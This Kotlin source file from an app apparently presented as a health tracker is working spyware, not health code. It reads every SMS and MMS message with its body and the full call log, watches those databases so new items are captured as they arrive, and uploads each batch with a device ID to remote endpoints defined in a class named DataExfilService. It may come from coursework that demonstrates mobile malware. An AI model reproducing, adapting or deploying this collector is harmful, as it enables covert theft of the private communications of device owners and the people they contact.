package com.inf2007.healthtracker.utilities.collectors

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.DeviceUtils
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class SmsCallLogCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "SmsCallLogCollector"
    }

    private val prefs by lazy {
        context.getSharedPreferences("sms_call_log_sync", Context.MODE_PRIVATE)
    }

    private val addedMessageIds = mutableSetOf<String>()

    private var smsObserver: ContentObserver? = null
    private var callLogObserver: ContentObserver? = null

    override fun startObserving() {
        // Observers are already set up in DataExfilService
        collect()
        Log.d(TAG, "SMS/Call Log observing started")
    }

    override fun stopObserving() {
        // Observers are unregistered in DataExfilService
        Log.d(TAG, "SMS/Call Log observing stopped")
    }

    override fun collect() {
        // Perform initial full dumps when collector starts
        Thread {
            collectAndUploadAllMessages()
            collectAndUploadAllCallLogs()
        }.start()
    }

    fun collectAndUploadAllMessages() {
        Thread {
            try {
                val allMessages = JSONArray()
                addedMessageIds.clear()

                // Collect all SMS
                collectAllSms(Telephony.Sms.Inbox.CONTENT_URI, "inbox", allMessages)
                collectAllSms(Telephony.Sms.Sent.CONTENT_URI, "sent", allMessages)

                // Collect all MMS
                collectAllMms("inbox", allMessages)
                collectAllMms("sent", allMessages)

                // Group by thread and sort
                val sortedMessages = groupMessagesByConversation(allMessages)

                if (sortedMessages.length() > 0) {
                    Log.d(TAG, "Uploading ${sortedMessages.length()} total messages")
                    uploadMessageData(sortedMessages, "full_dump")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            }
        }.start()
    }

    fun collectAndUploadAllCallLogs() {
        Thread {
            try {
                val callLogs = JSONArray()
                val addedCallIds = mutableSetOf<Long>()

                val cursor = context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls._ID,
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.DURATION,
                        CallLog.Calls.DATE,
                        CallLog.Calls.TYPE
                    ),
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC"
                )

                cursor?.use {
                    val idColumn = it.getColumnIndexOrThrow(CallLog.Calls._ID)
                    val numberColumn = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val durationColumn = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                    val dateColumn = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val typeColumn = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)

                    while (it.moveToNext()) {
                        val callId = it.getLong(idColumn)

                        if (!addedCallIds.contains(callId)) {
                            val type = it.getInt(typeColumn)
                            val typeStr = when (type) {
                                CallLog.Calls.INCOMING_TYPE -> "incoming"
                                CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                CallLog.Calls.MISSED_TYPE -> "missed"
                                else -> "other"
                            }

                            val callJson = JSONObject().apply {
                                put("id", callId)
                                put("number", it.getString(numberColumn) ?: "Unknown")
                                put("duration", it.getLong(durationColumn))
                                put("time", it.getLong(dateColumn))
                                put("type", typeStr)
                            }

                            callLogs.put(callJson)
                            addedCallIds.add(callId)
                            prefs.edit().putBoolean("call_$callId", true).apply()
                        }
                    }
                }

                if (callLogs.length() > 0) {
                    uploadCallLogData(callLogs, "full_dump")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            }
        }.start()
    }

    // ========== INCREMENTAL/NEW METHODS ==========

    fun collectNewMessages() {
        Thread {
            try {
                val newMessages = JSONArray()

                // Check SMS inbox for new messages
                checkNewSms(Telephony.Sms.Inbox.CONTENT_URI, "inbox", newMessages)
                // Check SMS sent for new messages
                checkNewSms(Telephony.Sms.Sent.CONTENT_URI, "sent", newMessages)
                // Check MMS for new messages
                checkNewMms("inbox", newMessages)
                checkNewMms("sent", newMessages)

                if (newMessages.length() > 0) {
                    Log.d(TAG, "Found ${newMessages.length()} new messages")
                    uploadMessageData(newMessages, "incremental")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error collecting new messages: ${e.message}")
            }
        }.start()
    }

    fun collectNewCalls() {
        Thread {
            try {
                val newCalls = JSONArray()
                val fiveMinutesAgo = System.currentTimeMillis() - (5 * 60 * 1000)
                val selection = "${CallLog.Calls.DATE} > ?"
                val selectionArgs = arrayOf(fiveMinutesAgo.toString())

                val cursor = context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls._ID,
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.DURATION,
                        CallLog.Calls.DATE,
                        CallLog.Calls.TYPE
                    ),
                    selection,
                    selectionArgs,
                    "${CallLog.Calls.DATE} DESC"
                )

                cursor?.use {
                    val idColumn = it.getColumnIndexOrThrow(CallLog.Calls._ID)
                    val numberColumn = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val durationColumn = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                    val dateColumn = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val typeColumn = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)

                    while (it.moveToNext()) {
                        val callId = it.getLong(idColumn)
                        val prefsKey = "call_$callId"

                        if (!prefs.getBoolean(prefsKey, false)) {
                            val type = it.getInt(typeColumn)
                            val typeStr = when (type) {
                                CallLog.Calls.INCOMING_TYPE -> "incoming"
                                CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                CallLog.Calls.MISSED_TYPE -> "missed"
                                else -> "other"
                            }

                            val callJson = JSONObject().apply {
                                put("id", callId)
                                put("number", it.getString(numberColumn) ?: "Unknown")
                                put("duration", it.getLong(durationColumn))
                                put("time", it.getLong(dateColumn))
                                put("type", typeStr)
                            }

                            newCalls.put(callJson)
                            prefs.edit().putBoolean(prefsKey, true).apply()
                        }
                    }
                }

                if (newCalls.length() > 0) {
                    Log.d(TAG, "Found ${newCalls.length()} new calls")
                    uploadCallLogData(newCalls, "incremental")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error collecting new calls: ${e.message}")
            }
        }.start()
    }

    private fun collectAllSms(uri: Uri, folderName: String, allMessages: JSONArray) {
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.THREAD_ID
        )

        val cursor = context.contentResolver.query(uri, projection, null, null, "date ASC")

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(Telephony.Sms._ID)
            val addressColumn = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
            val bodyColumn = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
            val dateColumn = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
            val threadIdColumn = it.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID)

            while (it.moveToNext()) {
                val smsId = it.getLong(idColumn)
                val uniqueKey = "sms_${folderName}_$smsId"

                if (!addedMessageIds.contains(uniqueKey)) {
                    val smsJson = JSONObject().apply {
                        put("id", smsId)
                        put("type", "sms")
                        put("from", if (folderName == "inbox") it.getString(addressColumn) else "me")
                        put("to", if (folderName == "sent") it.getString(addressColumn) else "me")
                        put("text", it.getString(bodyColumn) ?: "")
                        put("time", it.getLong(dateColumn))
                        put("thread", it.getLong(threadIdColumn))
                    }

                    allMessages.put(smsJson)
                    addedMessageIds.add(uniqueKey)
                    prefs.edit().putBoolean(uniqueKey, true).apply()
                }
            }
        }
    }

    private fun checkNewSms(uri: Uri, folderName: String, newMessages: JSONArray) {
        Log.d(TAG, "checkNewSms() for $folderName")
        val projection = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.THREAD_ID
        )

        // Only get messages from the last 5 minutes
        val fiveMinutesAgo = System.currentTimeMillis() - (5 * 60 * 1000)
        val selection = "${Telephony.Sms.DATE} > ?"
        val selectionArgs = arrayOf(fiveMinutesAgo.toString())

        val cursor = context.contentResolver.query(
            uri,
            projection,
            selection,
            selectionArgs,
            "${Telephony.Sms.DATE} ASC"
        )

        cursor?.use {
            val idColumn = it.getColumnIndexOrThrow(Telephony.Sms._ID)
            val addressColumn = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
            val bodyColumn = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
            val dateColumn = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
            val threadIdColumn = it.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID)

            while (it.moveToNext()) {
                val smsId = it.getLong(idColumn)
                val uniqueKey = "sms_${folderName}_$smsId"

                if (!prefs.getBoolean(uniqueKey, false)) {
                    val smsJson = JSONObject().apply {
                        put("id", smsId)
                        put("type", "sms")
                        put("from", if (folderName == "inbox") it.getString(addressColumn) else "me")
                        put("to", if (folderName == "sent") it.getString(addressColumn) else "me")
                        put("text", it.getString(bodyColumn) ?: "")
                        put("time", it.getLong(dateColumn))
                        put("thread", it.getLong(threadIdColumn))
                    }

                    newMessages.put(smsJson)
                    prefs.edit().putBoolean(uniqueKey, true).apply()
                }
            }
        }
    }

    private fun collectAllMms(folder: String, allMessages: JSONArray) {
        try {
            val uri = if (folder == "inbox")
                Uri.parse("content://mms/inbox")
            else
                Uri.parse("content://mms/sent")

            val cursor = context.contentResolver.query(
                uri,
                arrayOf("_id", "thread_id", "date", "msg_box"),
                null, null, "date ASC"
            )

            cursor?.use {
                val idColumn = it.getColumnIndexOrThrow("_id")
                val threadIdColumn = it.getColumnIndexOrThrow("thread_id")
                val dateColumn = it.getColumnIndexOrThrow("date")

                while (it.moveToNext()) {
                    val mmsId = it.getLong(idColumn)
                    val uniqueKey = "mms_${folder}_$mmsId"

                    if (!addedMessageIds.contains(uniqueKey)) {
                        val address = getMmsAddress(mmsId, folder)
                        val body = extractMmsText(mmsId)

                        val mmsJson = JSONObject().apply {
                            put("id", mmsId)
                            put("type", "mms")
                            put("from", if (folder == "inbox") address else "me")
                            put("to", if (folder == "sent") address else "me")
                            put("text", if (body.isNotEmpty()) body else "[Media Message]")
                            put("time", it.getLong(dateColumn) * 1000L)
                            put("thread", it.getLong(threadIdColumn))
                        }

                        allMessages.put(mmsJson)
                        addedMessageIds.add(uniqueKey)
                        prefs.edit().putBoolean(uniqueKey, true).apply()
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun checkNewMms(folder: String, newMessages: JSONArray) {
        try {
            val uri = if (folder == "inbox")
                Uri.parse("content://mms/inbox")
            else
                Uri.parse("content://mms/sent")

            val fiveMinutesAgo = (System.currentTimeMillis() / 1000) - (5 * 60) // MMS uses seconds
            val selection = "date > ?"
            val selectionArgs = arrayOf(fiveMinutesAgo.toString())

            val cursor = context.contentResolver.query(
                uri,
                arrayOf("_id", "thread_id", "date", "msg_box"),
                selection,
                selectionArgs,
                "date ASC"
            )

            cursor?.use {
                val idColumn = it.getColumnIndexOrThrow("_id")
                val threadIdColumn = it.getColumnIndexOrThrow("thread_id")
                val dateColumn = it.getColumnIndexOrThrow("date")

                while (it.moveToNext()) {
                    val mmsId = it.getLong(idColumn)
                    val uniqueKey = "mms_${folder}_$mmsId"

                    if (!prefs.getBoolean(uniqueKey, false)) {
                        val address = getMmsAddress(mmsId, folder)
                        val body = extractMmsText(mmsId)

                        val mmsJson = JSONObject().apply {
                            put("id", mmsId)
                            put("type", "mms")
                            put("from", if (folder == "inbox") address else "me")
                            put("to", if (folder == "sent") address else "me")
                            put("text", if (body.isNotEmpty()) body else "[Media Message]")
                            put("time", it.getLong(dateColumn) * 1000L)
                            put("thread", it.getLong(threadIdColumn))
                        }

                        newMessages.put(mmsJson)
                        prefs.edit().putBoolean(uniqueKey, true).apply()
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun getMmsAddress(mmsId: Long, folder: String): String {
        return try {
            val addrUri = Uri.parse("content://mms/$mmsId/addr")
            val cursor = context.contentResolver.query(addrUri, null, null, null, null)

            cursor?.use {
                val addressColumn = it.getColumnIndex("address")
                val typeColumn = it.getColumnIndex("type")

                while (it.moveToNext()) {
                    val type = if (typeColumn != -1) it.getInt(typeColumn) else -1
                    if (folder == "inbox" && type == 137) {
                        return it.getString(addressColumn) ?: "Unknown"
                    } else if (folder == "sent" && type == 151) {
                        return it.getString(addressColumn) ?: "Unknown"
                    }
                }
            }
            "Unknown"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun extractMmsText(mmsId: Long): String {
        try {
            val partUri = Uri.parse("content://mms/part")
            val cursor = context.contentResolver.query(
                partUri,
                null,
                "mid = ?",
                arrayOf(mmsId.toString()),
                null
            )

            cursor?.use {
                val textColumn = it.getColumnIndex("text")
                val contentTypeColumn = it.getColumnIndex("ct")

                while (it.moveToNext()) {
                    val contentType = if (contentTypeColumn != -1) it.getString(contentTypeColumn) else ""

                    if (contentType.contains("text/plain") && textColumn != -1) {
                        val text = it.getString(textColumn)
                        if (!text.isNullOrEmpty() && !text.contains("<smil>")) {
                            return text
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
        return ""
    }

    private fun groupMessagesByConversation(messages: JSONArray): JSONArray {
        val messagesByThread = mutableMapOf<Long, JSONArray>()

        for (i in 0 until messages.length()) {
            val msg = messages.getJSONObject(i)
            val threadId = msg.optLong("thread", -1)

            if (threadId != -1L) {
                messagesByThread.getOrPut(threadId) { JSONArray() }.put(msg)
            }
        }

        val sortedMessages = JSONArray()
        val threadIds = messagesByThread.keys.sortedByDescending { threadId ->
            messagesByThread[threadId]?.let { threadMessages ->
                var maxTime = 0L
                for (j in 0 until threadMessages.length()) {
                    val time = threadMessages.getJSONObject(j).optLong("time", 0)
                    if (time > maxTime) maxTime = time
                }
                maxTime
            } ?: 0L
        }

        threadIds.forEach { threadId ->
            val threadMessages = messagesByThread[threadId]!!
            val messageList = mutableListOf<JSONObject>()

            for (j in 0 until threadMessages.length()) {
                messageList.add(threadMessages.getJSONObject(j))
            }

            messageList.sortBy { it.optLong("time", 0) }
            messageList.forEach { sortedMessages.put(it) }
        }

        return sortedMessages
    }

    private fun uploadMessageData(messagesList: JSONArray, dumpType: String) {
        try {
            val deviceId = DeviceUtils.getUniqueDeviceId(context)

            val data = JSONObject().apply {
                put("type", dumpType)
                put("device_id", deviceId)
                put("model", Build.MODEL)
                put("time", System.currentTimeMillis())
                put("total", messagesList.length())
                put("messages", messagesList)
            }

            val requestBody = data.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(com.inf2007.healthtracker.utilities.DataExfilService.SMS_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Upload failed: ${e.message}")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Uploaded ${messagesList.length()} messages")
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }

    private fun uploadCallLogData(callList: JSONArray, dumpType: String) {
        try {
            val deviceId = DeviceUtils.getUniqueDeviceId(context)

            val data = JSONObject().apply {
                put("type", dumpType)
                put("device_id", deviceId)
                put("model", Build.MODEL)
                put("time", System.currentTimeMillis())
                put("total", callList.length())
                put("calls", callList)
            }

            val requestBody = data.toString()
                .toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(com.inf2007.healthtracker.utilities.DataExfilService.CALL_LOG_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Upload failed: ${e.message}")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Uploaded ${callList.length()} calls")
                    }
                    response.close()
                }
            })

        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }

    fun setupObservers(contentResolver: ContentResolver) {
        Log.d(DataExfilService.Companion.TAG, "========== SETTING UP SMS, MMS, AND CALL LOG OBSERVERS ==========")

        // Create a single observer that triggers for any message change
        val messageObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                Log.d(TAG, "MESSAGE DATABASE CHANGED (no URI) - checking for new messages")
                collectNewMessages()
            }

            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "MESSAGE DATABASE CHANGED with URI: $uri - checking for new messages")
                collectNewMessages()
            }
        }

        // Register for ALL possible message-related URIs
        val messageUris = listOf(
            Uri.parse("content://sms"),           // SMS
            Uri.parse("content://sms/inbox"),     // SMS inbox
            Uri.parse("content://sms/sent"),      // SMS sent
            Uri.parse("content://mms"),           // MMS
            Uri.parse("content://mms/inbox"),     // MMS inbox
            Uri.parse("content://mms/sent"),      // MMS sent
            Uri.parse("content://mms-sms"),       // Combined
            Uri.parse("content://mms-sms/conversations") // Conversations
        )

        messageUris.forEach { uri ->
            try {
                contentResolver.registerContentObserver(
                    uri,
                    true,
                    messageObserver
                )
                Log.d(DataExfilService.Companion.TAG, "Observer registered for $uri")
            } catch (e: Exception) {
                Log.d(DataExfilService.Companion.TAG, "Cannot register for $uri: ${e.message}")
            }
        }

        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "CallLog onChange() called with URI: $uri")
                collectNewCalls()
            }
        }

        contentResolver.registerContentObserver(
            CallLog.Calls.CONTENT_URI,
            true,
            callLogObserver!!
        )

        Log.d(DataExfilService.Companion.TAG, "CallLog observer registered")
    }

    fun removeObservers(contentResolver: ContentResolver) {
        try {
            smsObserver?.let { contentResolver.unregisterContentObserver(it) }
            callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error removing observers: ${e.message}")
        }
    }
}